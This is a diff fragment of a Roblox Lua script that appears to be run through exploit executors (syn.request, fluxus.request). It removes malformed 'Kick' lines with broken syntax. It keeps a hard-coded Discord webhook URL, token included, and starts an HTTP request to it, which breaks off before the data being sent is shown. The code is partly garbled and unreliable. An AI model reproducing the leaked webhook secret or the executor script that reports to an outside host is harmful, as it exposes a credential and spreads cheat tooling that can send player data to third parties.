@@ -18,16 +18,7 @@ local function isCurrentPlayerBanned()
     return true
 end
 if isCurrentPlayerBanned() then
-game.Players:FindFirstChild("):Kick('Blacklisted.')
-game.Players:FindFirstChild(''):Kick('Blacklisted.')
-game.Players:FindFirstChild(''):Kick('Blacklisted.')
-game.Players:FindFirstChild(''):Kick('Blacklisted.')
-game.Players:FindFirstChild(''):Kick('Blacklisted.')
-game.Players:FindFirstChild(''):Kick('Blacklisted.')
-)
-()
-end
-    local HttpService = game:GetService("HttpService")
+   local HttpService = game:GetService("HttpService")
 Webhook_URL =  "https://discord.com/api/webhooks/1264042957355352136/2afSh5tP0vsNMysW4FytdrJjgdw3mGYzgogGw5pJeSPKC6BsZG9Wv_bmbsEKVPt-j5a3"
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 httprequest(
